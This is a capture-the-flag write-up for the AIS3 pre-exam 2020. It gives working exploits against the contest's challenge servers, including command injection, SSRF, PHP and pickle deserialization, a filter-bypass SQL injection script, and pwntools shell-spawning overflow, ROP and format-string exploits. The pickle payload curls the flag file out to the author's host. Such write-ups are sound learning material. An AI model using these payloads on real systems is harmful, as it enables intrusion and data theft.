# AIS3 pre-exam 2020 write up

:::info
Ranking 4
:::

---


## web

### 🐿️Squirrel

Find an api:
`https://squirrel.ais3.org/api.php?get=/etc/passwd`
Which return /etc/passwd

Try:
`https://squirrel.ais3.org/api.php?get=api.php`
Get the source code

The important part:
```language=php
$file = @$_GET['get']
shell_exec("cat '$file'");
```

Try:
`https://squirrel.ais3.org/api.php?get=';cat /*;'`
Get command injection and get flag

### 🦈Shark

Get source code:
`https://shark.ais3.org/?path=index.php`

Check /etc/hosts:
`https://shark.ais3.org/?path=file:///etc/hosts`

Get flag:
`https://shark.ais3.org/?path=http://172.22.0.2/flag`

### 🐘Elephant

Find source code:
`https://elephant.ais3.org/.git/`

Generate cookie:
```lua=php
class User {
    public $name;
    private $token;

    function __construct($name) {
        $this->name = $name;
        $this->token = [];
    }

    function canReadFlag() {
        return strcmp($flag, $this->token) == 0;
    }
}
$user = new User('ginoah');
$data = base64_encode(serialize($user));
echo $data;
```

Set cookie:
`elephant_user:
Tzo0OiJVc2VyIjoyOntzOjQ6Im5hbWUiO3M6NjoiZ2lub2FoIjtzOjExOiIAVXNlcgB0b2tlbiI7YTowOnt9fQ==`

Get flag

### 🐍Snake


Pickle deserialization vulnerability
```lua=py
import base64
import pickle
class RCE:
	def __reduce__(self):
		cmd = ('curl --data "@/flag" http://ginoah.com:1337')
		return __import__('os').system, (cmd,)


pickled = pickle.dumps(RCE())
print(base64.b64encode(pickled))
```

Final payload:
```
https://snake.ais3.org/?data=gANjcG9zaXgKc3lzdGVtCnEAWCsAAABjdXJsIC0tZGF0YSAiQC9mbGFnIiBodHRwOi8vZ2lub2FoLmNvbToxMzM3cQGFcQJScQMu
```
will send /flag to ginoah.com:1337


### 🦉Owl


WAF:
```lua=php
$bad = [' ', '/*', '*/', 'select', 'union', 'or', 'and', 'where', 'from', '--'];
$username = str_ireplace($bad, '', $username);
$username = str_ireplace($bad, '', $username);
querySingle("SELECT * FROM users WHERE username = '$username' AND password = '$hash'", true);
```
Then:
`'ssselectelectelect' => 'select'`

SQLi, save username to $user, Login, show $user.
=> Union base!

```lus=py
import requests

url = 'https://turtowl.ais3.org/?action=login'
nurl = 'https://turtowl.ais3.org'
se = "ssselectelectelect"
fr = "fffromromrom"
wh = "wwwhereherehere"
un = "uuunionnionnion"
OR = "ooorrr"

for i in range(100):
	myobj = {
		'csrf_token': 'LDFEAAdjQOZc/3lLvfLkTn+37QZLBLEqmNigSWdn8AKFtmb4Vu32THAbB3l97xr+bP9Tgl8qCu7J05r3W4/huw==',
		'username':f"""'{un} {se} null, value, null {fr} garbage limit {i}, 1;""".replace(' ', '\n'),
		'password':'1',
		'submit':'Login'
	}

	headers = {'Cookie': 'PHPSESSID=8b436fb10bbc2b9abf50b361a65d5906'}

	x = requests.post(url, data = myobj, headers=headers, allow_redirects = False).text
	x = requests.get(nurl, headers=headers, allow_redirects = False).text.split('Hello, <b>')[1]
	f = x.index('</b>')
	
	print(x[:f])
```
Get flag


### 🦏Rhino

Sensitive file:
`https://rhino.ais3.org/robots.txt`

package.json:
`https://rhino.ais3.org/package.json`

source code:
`https://rhino.ais3.org/chill.js`

```lua=js
n = 1e-31
if(n && (n+420)==420)
    pass
```

final payload:
```lua
//set cookie manually
[
    {
        "name": "express:sess.sig",
        "value": "5DwBleu7j3213lxSHUhqo9QbwIY",
    },
    {
        "name": "express:sess",
        "value": "eyJtYWdpYyI6MWUtMzF9",
    }
]
```

Get flag:
`https://rhino.ais3.org/flag.txt`

## misc

### 💤Piquero

Translate the [Braille](https://www.mathsisfun.com/braille-translation.html) into flag

### 🐥Karuego
Use **binwalk** to extrack the zip file padding after jpg file
Then use **hashcat** with **rockyou.txt** to brute force the password of zip file,  get the flag

### 🌱Soy

Use [QrazyBox](https://merricx.github.io/qrazybox/) and [Qrcode_Monkey](https://www.qrcode-monkey.com) to recover the broken QRcode

### 👑Saburo

If the character is right, the responce time will get longer for about 10 millisecond each char.
Write a script to brute force each char.
```lus=py
from pwn import *

import string

s = string.printable
flag = 'AIS3{'

pre = 0
for i in range(3):
    r = remote('60.250.197.227', 11001)
    r.recvuntil(':')
    r.sendline(flag)
    re = r.recvline()
    pre += int(re.split()[4])
    r.close()
print(flag, pre)
for j in range(800):
    ma = 0
    for i in s:
        d = 0
        for k in range(3):
            r = remote('60.250.197.227', 11001)
            r.recvuntil(':')
            r.sendline(flag+i)
            re = r.recvline()
            m = int(re.split()[4])
            r.close()
            d += m

        if d > ma:
            ma = d
            c = i
    print(flag+c, ma)
    if(ma > pre + 20):
        pre = ma
        flag += c
    else:
        print(f"max is {ma}, pre is {pre}, flag is {flag}")
        flag = flag[:-1]
        pre -= 20
```

### 👿Shichirou

ref: [Inndy's writeup for AIS3 pre-exam 2016 - misc3](https://github.com/Inndy/ctf-writeup/blob/8dd6e7c886eb104b530dc88cdfcb0b54e5333e62/2016-ais3-pre-exam/misc3.md)
`$: echo "\n\r\n\r"|nc 60.250.197.227 11000`
Find the script is at `/home/ctf/Shichirou.py` from error message

Let guess.txt be the symbolic link to flag.txt
```
ln -s /home/ctf/flag.txt guess.txt
tar -cf payload guess.txt
SIZE=$(wc -c < payload)
(echo $SIZE; cat misc3.payload) | nc 60.250.197.227
```

get the flag


## pwn

### 👻 BOF
```lus=py
from pwn import *
context.arch="amd64"
#r = process('./bof')
#r = remote('localhost', 4444)
r = remote('60.250.197.227', 10000)
input()
evil =  0x400688
payload = b'a'*56+p64(evil)
r.sendline(payload)
r.interactive()
```
### 📃 Nonsense
```lus=py
from pwn import *

context.arch="amd64"
#r = remote('localhost', 4004)
r = remote('60.250.197.227', 10001)
r.sendline('/bin/sh\x00')
payload = b'w '
payload += b"wubbalubbadubdub"
payload = payload.ljust(0x22, b'a')
payload += asm("""
        mov rdi, 0x601100
        mov rsi, 0
        mov rdx, 0
        mov rax, 0x3b
        syscall
        """)
print(payload, len(payload))
r.sendline(payload)
r.interactive()
```
### 🔫 Portal gun
```lus=py
from pwn import *

#r = remote('localhost', 4004)
r = remote('60.250.197.227', 10002)

context.arch = "amd64"

input()
main = 0x4006fb
puts = 0x400720
pop_rdi = 0x4007a3
put_got = 0x601018
w = 0x00601800
one = 0x10a38c
r.recvuntil('?\n')
payload = b'a'*0x70
payload = flat([payload,w,pop_rdi, put_got, puts])
r.sendline(payload)
puts_libc = u64(r.recv().strip()+b'\x00\x00')
print(f"put: {hex(puts_libc)}")
libc = puts_libc -  0x809c0
print(f"libc: {hex(libc)}")
payload = b'a'*0x70
payload = flat([payload,w,libc+one])
r.sendline(payload)

r.interactive()
```
### 🏫 Morty school
```lus=py
from pwn import *

#r = remote('localhost', 4004)
r = remote('60.250.197.227', 10003)
context.arch="amd64"

input()
r.recvuntil('information:')
re = r.recvline().strip()
puts = int(re, 16)
libc = puts - 0x0809c0
print(f"libc: {hex(libc)}")
r.recvuntil('teach?')

pay = b'-87669'
r.sendline(pay)
sleep(1)

one=0x10a38c+libc
payload = flat([one]*4)
r.sendline(payload)

r.interactive()
```
### 🔮Death crystal
```lus=py
from pwn import *

context.arch="amd64"
r = remote('60.250.197.227', 10004)
input()

off = 0x201540
pay = '%d'*4+'%lx'*7+'|%lx\n'
pay = pay.ljust(39, 'a')
r.sendline(pay)
print(r.recvuntil('|'))
pie = r.recvuntil('\n', drop=True).strip()
#pie = u64(pie.ljust(8,b'\x00'))
pie = int(pie.decode('utf-8'),16)
print(f"pie: {hex(pie)}")
pay = b'%d'*5+b'%ld'*3+b"0x%sx"+p64(pie+off)
pay = pay.ljust(39, b'a')
r.sendline(pay)
r.interactive()
```


## rev

### 🍍TsaiBro
```lua=py
s = open('TsaiBroSaid').read()
s = s.split('發財')[1:]

import string
from pwn import *

flag = ''
for i in range(1, 100):
    for c in string.printable:
        r = process(['./TsaiBro', flag+c])
        out = r.recv()
        if out.decode('utf-8').split('發財')[1:] == s[:i*2]:
            flag += c
            print(flag)
            break
        r.close()
```

### 🎹Fallen Beat
decompile useing [online decompiler](http://www.javadecompilers.com)

write `Main-Class: Control.Main` to `META-INF/MANIFEST.MF`
use:
```
javac */*.java;
jar cmvf META-INF/MANIFEST.MF pp.jar */*.class;
java -jar pp.jar
```
to compile and run

chang the 175 line of Visual/PanelEnding.java to if(true) to get flag.

### 🧠 Stand up!Brain

find:
```-------------------------------------------------------------------[>[-]<[-]]>[>--------------------------------------------------------[>[-]<[-]]>[>-------------------------------------------------------[>[-]<[-]]>[>------------------------------------------------------[>[-]<[-]]>[>---------------------------------------------------[>[-]<[-]]>[>---------------------------------[>[-]<[-]]>[>>----[---->+<]>++.++++++++.++++++++++.>-[----->+<]>.+[--->++<]>+++.>-[--->+<]>-.[---->+++++<]>-.[-->+<]>---.[--->++<]>---.++[->+++<]>.+[-->+<]>+.[--->++<]>---.++[->+++<]>.+++.[--->+<]>----.[-->+<]>-----.[->++<]>+.-[---->+++<]>.--------.>-[--->+<]>.-[----->+<]>-.++++++++.--[----->+++<]>.+++.[--->+<]>-.-[-->+<]>---.++[--->+++++<]>.++++++++++++++.+++[->+++++<]>.[----->+<]>++.>-[----->+<]>.---[->++<]>-.++++++.[--->+<]>+++.+++.[-]]]]]]]```
in the binary
The joke is `C8763!`, get the flag

### 🍹Long Island Iced Tea

```lus=py
from pwn import *
import string
s = string.printable
for i in 'g'+s:
    for j in s:
        for k in s:

            t = f'AIS3\x7b{j+k+i}irl_g1v3_m3_Ur_IG_4nd_th1s_1s_m1ne_terryterry__\x7d'
            r = process('./Long')
            r.recvuntil('drunk\n')
            r.sendline(t)
            re = r.recv()
            r.close()
            if re == b'850a2a4d3fac148269726c5f673176335f6d335f55725f49475f346e645f746831735f31735f6d316e655f746572727974657272795f5f7d0000000000000000':
                print('got you!!!!')
                print(f'flag: {t}')
                exit()
```

## crypto

### 🦕 Brontosaurus
It's JSfuck, reverse the string and execute in brower's console

### 🦖 T-Rex
Write script to decode

### 🐙 Octopus
```lus=py
basis=/**/
qubits=/**/
myBasis=/**/
flag = 2114605261815340712424659413225647507317872952942366497800823462312932228799031989657646284020761432666257418566252521668
l = 1024
key = []
okey = []
for i in range(l):
	if basis[i] == myBasis[i]:
		if qubits[i] == 1j or qubits[i] == (0.707+0.707j):
			key.append('1')
			okey.append('0')
		else:
			key.append('0')
			okey.append('1')

print(int(''.join(key[:400]),2)^flag)
print(int(''.join(okey[:400]),2)^flag)
```
### 🐡 Blowfish

```lus=py
from pwn import *
import base64
r = remote('60.250.197.227', 12001)
r.recvuntil('token: ')
prompt = r.recvuntil('\n', drop=True)
pi = base64.b64decode(prompt)
pi = list(pi)
pi[74]+=1
pi = bytes(pi)
token = base64.b64encode(pi)
r.sendline('maojui')
r.sendline('SECRET')
r.sendline(token)
r.interactive()
r.close()
```